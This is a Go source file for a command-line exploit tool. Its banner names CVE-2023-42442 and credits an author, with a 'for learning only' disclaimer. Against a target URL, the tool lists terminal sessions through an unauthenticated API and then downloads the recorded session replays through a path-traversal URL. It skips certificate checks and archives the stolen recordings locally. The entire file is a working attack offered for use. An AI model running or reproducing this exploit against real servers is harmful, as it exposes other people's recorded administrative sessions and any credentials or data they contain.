package main

import (
	"archive/tar"
	"compress/gzip"
	"crypto/tls"
	"encoding/json"
	"flag"
	"fmt"
	"github.com/go-resty/resty/v2"
	log "github.com/sirupsen/logrus"
	"io"
	"net/url"
	"os"
	"path/filepath"
	"strings"
	"time"
)

var PROXIES string

func init() {
	// 配置日志格式
	log.SetFormatter(&log.TextFormatter{
		ForceColors:               true,
		EnvironmentOverrideColors: true,                  // 显示颜色
		TimestampFormat:           "2006-01-02 15:04:05", // 格式化时间
		FullTimestamp:             true,
		DisableLevelTruncation:    true,
	})

	// 设置日志级别为: Info
	log.SetLevel(log.InfoLevel)

}

func main() {
	banner()
	target := flag.String("t", "", "Target Url")
	proxy := flag.String("proxy", "", "Proxy Url: http/https://IP:Port")

	flag.Parse()

	if *target == "" {
		fmt.Println("Missing required arguments.")
		flag.Usage()
		return
	}

	if *proxy != "" {
		PROXIES = *proxy
	}

	run(*target)

}

func run(target string) {
	client := createClient()

	// 定义文件保存路径
	folderPath, err := createFolderFromURL(target)
	if err != nil {
		log.Fatalf("Failed to create folder: %v", err)
	} else {
		log.Infof("Folder already exists or created successfully: %s", folderPath)
	}

	if checkAPI(target, folderPath, client) == true {
		exploit(target, folderPath, client)
		if err = RemoveGzFiles(folderPath); err != nil {
			log.Infof("Error: %v", err)
		}
	}

}

func createClient() *resty.Client {
	headers := map[string]string{
		"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36",
	}

	// 配置 client
	client := resty.New().
		SetHeaders(headers).
		SetTLSClientConfig(&tls.Config{InsecureSkipVerify: true}) // 忽略证书

	// 配置代理
	if PROXIES != "" {
		client.SetProxy(PROXIES)
	}

	return client
}

func checkAPI(target string, folderPath string, client *resty.Client) bool {
	sessionsURL := target + "/api/v1/terminal/sessions/"
	log.Infof("API Request URL: %s", sessionsURL)

	resp, err := client.R().Get(sessionsURL)
	if err != nil {
		log.Panicf("checkAPI Request Error: %v", err)
	} else {
		log.Infof("Request Info: %v", resp.IsSuccess())
	}

	if strings.Contains(resp.String(), "id") {
		var data []interface{}
		if err := json.Unmarshal(resp.Body(), &data); err != nil {
			log.Panicf("JSON Unmarshal failed: %v", err)
		}
		jsonPath := filepath.Join(folderPath, "sessions.json")
		writeJSONToFile(data, jsonPath)
		log.Info("Successful write to sessions.json")
		return true
	} else {
		log.Fatal(" Not Found Sessions")
		return false
	}

}

func writeJSONToFile(data interface{}, filePath string) {
	jsonData, err := json.MarshalIndent(data, "", "  ")
	if err != nil {
		log.Fatalf("JSON Parsing failed: %v", err)
	}

	if err := os.WriteFile(filePath, jsonData, 0777); err != nil {
		log.Fatalf("JSON Write failed: %v", err)
	}
}

func exploit(target string, folderPath string, client *resty.Client) {
	jsonPath := filepath.Join(folderPath, "sessions.json")
	jsonData, err := os.ReadFile(jsonPath)
	if err != nil {
		log.Fatalf("JSON Read failed: %v", err)
	}

	var result []interface{}
	if err := json.Unmarshal(jsonData, &result); err != nil {
		log.Fatalf("Unable to parse JSON: %v", err)
	}

	for _, session := range result {
		sessionMap, ok := session.(map[string]interface{})
		if !ok {
			log.Fatalf("Type conversion error: %v", ok)
			continue
		}

		// 判断是否有回放录像文件
		if sessionMap["can_replay"] == false {
			log.Warnf("Session [%v] has no replay", sessionMap["id"])
			continue
		}

		// 判断系统类型
		replayExt := getReplayExtension(sessionMap)

		// 时间转换
		parsedTime, err := time.Parse("2006/01/02 15:04:05 -0700", sessionMap["date_start"].(string))
		if err != nil {
			log.Fatalf("Time conversion failed: %v", err)
		}
		formattedDate := parsedTime.Format("2006-01-02")

		// 发起下载请求
		replayURL := target + "/media/xpack/../replay/" + formattedDate + "/" + sessionMap["id"].(string) + replayExt
		resp, err := client.R().Get(replayURL)
		if err != nil {
			log.Fatalf("Request failed: %v", err)
		}

		// CreateGzAddToTar
		err = CreateGzAddToTar(resp.Body(), folderPath, sessionMap["id"].(string), replayExt)
		if err != nil {
			log.Fatalf("Compressing to GZfile error: %v", err)
		} else {
			log.Infof("Replay file conversion completed successfully: [%v]", sessionMap["id"].(string))
		}

		resp.RawBody().Close()

	}
}

func getReplayExtension(sessionMap map[string]interface{}) string {
	protocol := strings.ToLower(sessionMap["protocol"].(string))
	if protocol == "rdp" {
		return ".replay.gz"
	} else {
		return ".cast.gz"
	}
}

func CreateGzAddToTar(respBody []byte, folderPath, sessionID, replayExt string) error {
	// 创建GZ文件，读取文件路径
	gzPath := filepath.Join(folderPath, sessionID)
	// 创建文件
	gzFile, err := os.Create(gzPath + replayExt)
	if err != nil {
		return err
	}
	defer func(gzFile *os.File) {
		err := gzFile.Close()
		if err != nil {
			log.Errorf("Failed to close gzfile: %v", err)
		}
	}(gzFile)

	// 创建gzip.Writer，并设置文件名
	gzipWriter := gzip.NewWriter(gzFile)
	gzipWriter.Header.Name = sessionID

	// 将数据写入GZ文件
	if _, err = gzipWriter.Write(respBody); err != nil {
		return err
	}

	// 必须关闭 gzip.Writer，否则无法写入数据
	if err := gzipWriter.Close(); err != nil {
		log.Errorf("failed to close gzip.Writer: %v", err)
	}

	// 匹配 sessionID 对应的 JSON 文件
	if err = sessionJSONRename(folderPath, sessionID); err != nil {
		log.Fatalf("Rename JSON failed: %v", err)
	}

	// 创建tar文件
	tarPath := filepath.Join(folderPath, sessionID+".tar")
	tarFile, err := os.Create(tarPath)
	if err != nil {
		log.Fatalf("Failed to create tar file: %v", err)
	}
	defer tarFile.Close()

	tarWriter := tar.NewWriter(tarFile)
	defer tarWriter.Close()

	// 添加 sessionID.json
	sessionIDJSON := filepath.Join(folderPath, sessionID+".json")
	if err = addFileToTar(sessionIDJSON, tarWriter); err != nil {
		log.Fatalf("Adding JSON file to tar fails: %v", err)
	}
	if err = os.Remove(sessionIDJSON); err != nil {
		log.Errorf("Remove JSON error: %v", err)
	}

	// 添加 sessionID.cast.gz
	sessionIDGZ := filepath.Join(folderPath, sessionID+replayExt)
	if err = addFileToTar(sessionIDGZ, tarWriter); err != nil {
		log.Fatalf("Adding cast.gz file to tar fails: %v", err)
	}

	return nil
}

func addFileToTar(filePath string, tarWriter *tar.Writer) error {
	file, err := os.Open(filePath)
	if err != nil {
		return err
	}
	defer file.Close()

	stat, err := file.Stat()
	if err != nil {
		return err
	}

	header := &tar.Header{
		Name:    filepath.Base(filePath),
		Mode:    int64(stat.Mode()),
		Size:    stat.Size(),
		ModTime: stat.ModTime(),
	}

	err = tarWriter.WriteHeader(header)
	if err != nil {
		return err
	}

	_, err = io.Copy(tarWriter, file)
	if err != nil {
		return err
	}

	return nil
}

func sessionJSONRename(folderPath, sessionID string) error {
	// 创建Tar文件
	oldPath := filepath.Join(folderPath, "sessions.json")
	sessionJSON := sessionID + ".json"
	newPath := filepath.Join(folderPath, sessionJSON)

	// 读取源文件的内容
	sessionJSONData, err := os.ReadFile(oldPath)
	if err != nil {
		return err
	}

	// 解析 JSON 数据
	var jsonData interface{}
	err = json.Unmarshal(sessionJSONData, &jsonData)
	if err != nil {
		return err
	}

	// 将 sessions.json 重命名为目标文件名
	err = os.Rename(oldPath, newPath)
	if err != nil {
		return err
	}

	// 将 JSON 数据重新编码为字符串
	encodedJSON, err := json.MarshalIndent(jsonData, "", "  ")
	if err != nil {
		return err
	}

	// 创建新的文件并写入源文件的内容
	err = os.WriteFile(oldPath, encodedJSON, 0777)
	if err != nil {
		return err
	}

	return nil
}

func createFolderFromURL(urlStr string) (string, error) {
	parsedURL, err := url.Parse(urlStr)
	if err != nil {
		return "", err
	}

	hostname := parsedURL.Hostname()
	if hostname == "" {
		return "", err
	}

	folderPath := filepath.Join(".", hostname)

	_, err = os.Stat(folderPath)
	if os.IsNotExist(err) {
		err := os.Mkdir(folderPath, 0777)
		if err != nil {
			return "", err
		}
	} else if err != nil {
		return "", err
	}

	return folderPath, nil
}

func RemoveGzFiles(folderPath string) error {
	// 获取当前目录下所有的.gz后缀文件
	gzFiles, err := filepath.Glob(filepath.Join(folderPath, "*.gz"))
	if err != nil {
		return err
	}

	// 删除所有的.gz文件
	for _, gzFile := range gzFiles {
		err := os.Remove(gzFile)
		if err != nil {
			return err
		}
	}

	return nil
}

func banner() {
	fmt.Println(`

	██████╗██╗   ██╗███████╗    ██████╗  ██████╗ ██████╗ ██████╗       ██╗  ██╗██████╗ ██╗  ██╗██╗  ██╗██████╗
	██╔════╝██║   ██║██╔════╝    ╚════██╗██╔═████╗╚════██╗╚════██╗      ██║  ██║╚════██╗██║  ██║██║  ██║╚════██╗
	██║     ██║   ██║█████╗█████╗ █████╔╝██║██╔██║ █████╔╝ █████╔╝█████╗███████║ █████╔╝███████║███████║ █████╔╝
	██║     ╚██╗ ██╔╝██╔══╝╚════╝██╔═══╝ ████╔╝██║██╔═══╝  ╚═══██╗╚════╝╚════██║██╔═══╝ ╚════██║╚════██║██╔═══╝
	╚██████╗ ╚████╔╝ ███████╗    ███████╗╚██████╔╝███████╗██████╔╝           ██║███████╗     ██║     ██║███████╗
	╚═════╝  ╚═══╝  ╚══════╝    ╚══════╝ ╚═════╝ ╚══════╝╚═════╝            ╚═╝╚══════╝     ╚═╝     ╚═╝╚══════╝

	@Auth: C1ph3rX13
	@Blog: https://c1ph3rx13.github.io
	@Note: 代码仅供学习使用，请勿用于其他用途
	`)
}
